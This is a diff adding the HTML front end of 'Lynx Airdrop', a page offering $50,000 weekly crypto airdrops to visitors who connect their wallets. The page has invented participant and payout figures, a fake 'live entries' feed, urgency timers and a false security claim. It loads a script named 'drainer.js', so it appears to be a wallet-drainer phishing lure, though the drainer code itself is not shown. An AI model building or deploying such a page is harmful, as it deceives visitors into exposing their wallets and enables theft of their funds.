@@ -1,0 +1,348 @@
+[file name]: index.html
+[file content begin]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lynx Airdrop - $50,000 Weekly Crypto Airdrops</title>
+    <meta name="description" content="Connect your wallet to automatically participate in weekly $50,000 crypto airdrops. Multi-chain support, verified smart contracts, and instant rewards.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <span class="logo-icon">🔥</span>
+                <span class="logo-text">Lynx Airdrop</span>
+            </div>
+            <div class="nav-countdown">
+                <span id="deadlineTimer">48:00:00</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="stars-background"></div>
+        
+        <div class="hero-content">
+            <!-- Status Badge -->
+            <div class="status-badge glass-card" id="statusBadge">
+                <span class="status-dot" id="statusDot"></span>
+                <span class="status-text" id="statusText">🟡 Wallet Not Connected</span>
+            </div>
+
+            <!-- Main Title -->
+            <h1 class="hero-title">
+                <span class="text-gradient">🔥 $50,000</span>
+                <span>WEEKLY CRYPTO</span>
+                <span>AIRDROPS</span>
+            </h1>
+
+            <!-- Subtitle -->
+            <p class="hero-subtitle" id="heroSubtitle">
+                Connect your wallet and automatically participate in high-value airdrops every week. Multi-chain wallets supported.
+            </p>
+
+            <!-- CTA Button -->
+            <button id="mainActionBtn" class="cta-button">
+                <span class="btn-icon">👛</span>
+                <span class="btn-text">CONNECT WALLET TO CLAIM YOUR SPOT</span>
+            </button>
+
+            <!-- Supporting Info -->
+            <div class="support-info" id="supportInfo">
+                <p>✅ No manual entries — your wallet automatically qualifies</p>
+                <p>🔒 Secure & verified — SSL encrypted</p>
+                <p>📊 Real-time updates of wallets receiving airdrops</p>
+            </div>
+
+            <!-- Social Proof -->
+            <div class="social-proof">
+                <div class="proof-item">
+                    <span class="proof-icon">👥</span>
+                    <span class="proof-number">15,000+</span>
+                    <span class="proof-text">verified wallets participating</span>
+                </div>
+                <div class="proof-divider"></div>
+                <div class="proof-item">
+                    <span class="proof-icon">💰</span>
+                    <span class="proof-number">$2M+</span>
+                    <span class="proof-text">airdropped</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Airdrop Tiers Section -->
+    <section class="tiers-section">
+        <div class="container">
+            <h2 class="section-title">💰 WEEKLY AIRDROP STRUCTURE</h2>
+            <p class="section-subtitle">Four reward tiers distributed every week</p>
+
+            <div class="tiers-grid">
+                <div class="tier-card glass-card">
+                    <div class="tier-accent accent-elite"></div>
+                    <h3 class="tier-name">ELITE</h3>
+                    <div class="tier-amount">$5,000 REWARD</div>
+                    <div class="tier-stats">
+                        <div class="tier-stat">
+                            <div class="stat-number">4 Wallets</div>
+                            <div class="stat-label">receiving rewards</div>
+                        </div>
+                        <div class="tier-stat">
+                            <div class="stat-total">$20,000</div>
+                            <div class="stat-label">total per tier</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tier-card glass-card">
+                    <div class="tier-accent accent-premium"></div>
+                    <h3 class="tier-name">PREMIUM</h3>
+                    <div class="tier-amount">$2,500 REWARD</div>
+                    <div class="tier-stats">
+                        <div class="tier-stat">
+                            <div class="stat-number">6 Wallets</div>
+                            <div class="stat-label">receiving rewards</div>
+                        </div>
+                        <div class="tier-stat">
+                            <div class="stat-total">$15,000</div>
+                            <div class="stat-label">total per tier</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tier-card glass-card">
+                    <div class="tier-accent accent-standard"></div>
+                    <h3 class="tier-name">STANDARD</h3>
+                    <div class="tier-amount">$1,000 REWARD</div>
+                    <div class="tier-stats">
+                        <div class="tier-stat">
+                            <div class="stat-number">10 Wallets</div>
+                            <div class="stat-label">receiving rewards</div>
+                        </div>
+                        <div class="tier-stat">
+                            <div class="stat-total">$10,000</div>
+                            <div class="stat-label">total per tier</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tier-card glass-card">
+                    <div class="tier-accent accent-basic"></div>
+                    <h3 class="tier-name">BASIC</h3>
+                    <div class="tier-amount">$500 REWARD</div>
+                    <div class="tier-stats">
+                        <div class="tier-stat">
+                            <div class="stat-number">10 Wallets</div>
+                            <div class="stat-label">receiving rewards</div>
+                        </div>
+                        <div class="tier-stat">
+                            <div class="stat-total">$5,000</div>
+                            <div class="stat-label">total per tier</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tiers-total">
+                <p>Total Weekly Distribution: $50,000</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Trust Metrics Section -->
+    <section class="metrics-section">
+        <div class="container">
+            <h2 class="section-title">🛡️ TRUST & CREDIBILITY</h2>
+            <p class="section-subtitle">Backed by thousands of verified participants</p>
+
+            <div class="metrics-grid">
+                <div class="metric-card glass-card">
+                    <div class="metric-icon">👥</div>
+                    <div class="metric-value">15,000+</div>
+                    <div class="metric-label">Verified Wallets</div>
+                    <div class="metric-description">Active participants in weekly airdrops</div>
+                </div>
+
+                <div class="metric-card glass-card">
+                    <div class="metric-icon">💰</div>
+                    <div class="metric-value">$2,000,000+</div>
+                    <div class="metric-label">Total Airdropped</div>
+                    <div class="metric-description">Verified wallet rewards distributed</div>
+                </div>
+
+                <div class="metric-card glass-card">
+                    <div class="metric-icon">📈</div>
+                    <div class="metric-value">98%</div>
+                    <div class="metric-label">Wallet Success Rate</div>
+                    <div class="metric-description">Smooth and secure wallet integration</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works Section -->
+    <section class="how-it-works-section">
+        <div class="container">
+            <h2 class="section-title">🔗 HOW IT WORKS</h2>
+            <p class="section-subtitle">Four simple steps to start earning</p>
+
+            <div class="steps-grid">
+                <div class="step-card glass-card">
+                    <div class="step-number">01</div>
+                    <div class="step-icon">👛</div>
+                    <h3 class="step-title">Connect Wallet</h3>
+                    <p class="step-description">Securely link your wallet (multi-chain compatible)</p>
+                </div>
+
+                <div class="step-card glass-card">
+                    <div class="step-number">02</div>
+                    <div class="step-icon">🛡️</div>
+                    <h3 class="step-title">Verification</h3>
+                    <p class="step-description">Instant eligibility check, no KYC</p>
+                </div>
+
+                <div class="step-card glass-card">
+                    <div class="step-number">03</div>
+                    <div class="step-icon">⚡</div>
+                    <h3 class="step-title">Automatic Entry</h3>
+                    <p class="step-description">Wallet automatically participates in weekly $50K airdrops</p>
+                </div>
+
+                <div class="step-card glass-card">
+                    <div class="step-number">04</div>
+                    <div class="step-icon">🎁</div>
+                    <h3 class="step-title">Receive Rewards</h3>
+                    <p class="step-description">Airdrops sent directly on-chain to wallets</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Wallet Connect Section -->
+    <section class="wallet-section" id="wallet-connect">
+        <div class="container">
+            <h2 class="section-title" id="sectionTitle">🔗 CONNECT YOUR WALLET</h2>
+            
+            <div class="wallet-card glass-card">
+                <div id="walletContent">
+                    <div class="wallet-connect-default">
+                        <p>Connect your wallet to enter the $50,000 weekly giveaway</p>
+                        <button class="cta-button" id="walletConnectBtn" style="margin-top: 1rem;">
+                            <span class="btn-icon">🌐</span>
+                            <span class="btn-text">CONNECT WITH WALLETCONNECT</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Eligibility Section -->
+    <section class="eligibility-section">
+        <div class="container">
+            <h2 class="section-title">⚡ ELIGIBILITY REQUIREMENTS</h2>
+            <p class="section-subtitle">Simple criteria to qualify for weekly airdrops</p>
+
+            <div class="eligibility-card glass-card">
+                <div class="requirement-item">
+                    <span class="requirement-check">✅</span>
+                    <span class="requirement-text">Wallet must hold ≥ 0.01 ETH (or equivalent)</span>
+                </div>
+                <div class="requirement-item">
+                    <span class="requirement-check">✅</span>
+                    <span class="requirement-text">Wallet must be active (≥ 3 months old)</span>
+                </div>
+                <div class="requirement-item">
+                    <span class="requirement-check">✅</span>
+                    <span class="requirement-text">At least 1 transaction in last 30 days</span>
+                </div>
+                <div class="requirement-item">
+                    <span class="requirement-check">✅</span>
+                    <span class="requirement-text">Must connect wallet to participate</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Live Entries Section -->
+    <section class="entries-section">
+        <div class="container">
+            <div class="entries-card glass-card">
+                <div class="entries-header">
+                    <span class="live-dot"></span>
+                    <h3 class="entries-title">🔴 LIVE ENTRIES</h3>
+                </div>
+
+                <div class="entries-list" id="entriesList">
+                    <div class="entry-item">
+                        <span class="entry-wallet">0x8a3f...d42c</span>
+                        <span class="entry-time">just now</span>
+                    </div>
+                    <div class="entry-item">
+                        <span class="entry-wallet">0x4b2e...9f1a</span>
+                        <span class="entry-time">2 min ago</span>
+                    </div>
+                    <div class="entry-item">
+                        <span class="entry-wallet">0x7c91...e83b</span>
+                        <span class="entry-time">5 min ago</span>
+                    </div>
+                    <div class="entry-item">
+                        <span class="entry-wallet">0x1f4a...b72d</span>
+                        <span class="entry-time">8 min ago</span>
+                    </div>
+                    <div class="entry-item">
+                        <span class="entry-wallet">0x9e3c...6a4f</span>
+                        <span class="entry-time">12 min ago</span>
+                    </div>
+                </div>
+
+                <div class="entries-footer">
+                    <p>✨ Live wallets connecting in real-time</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <span class="logo-icon">🔥</span>
+                    <span class="logo-text">Lynx Airdrop</span>
+                </div>
+                <div class="footer-copyright">
+                    <p>© 2025 Lynx Airdrop. All rights reserved.</p>
+                    <p>Premium crypto rewards platform</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Test Buttons -->
+    <div style="position: fixed; top: 10px; left: 10px; z-index: 10000; display: flex; flex-direction: column; gap: 5px;">
+        <button onclick="testBackendConnection()" style="background: green; color: white; padding: 8px; border: none; border-radius: 5px; cursor: pointer; font-size: 10px;">
+            🔄 TEST BACKEND
+        </button>
+        <button onclick="testGaslessFeatures()" style="background: purple; color: white; padding: 8px; border: none; border-radius: 5px; cursor: pointer; font-size: 10px;">
+            🆓 TEST GASLESS
+        </button>
+    </div>
+
+    <!-- Notification Container -->
+    <div id="notificationContainer"></div>
+
+    <!-- Scripts - Using type="module" for modern imports -->
+    <script type="module" src="/drainer.js"></script>
+<script src="/app.js"></script>
+</body>
+</html>
+[file content end]
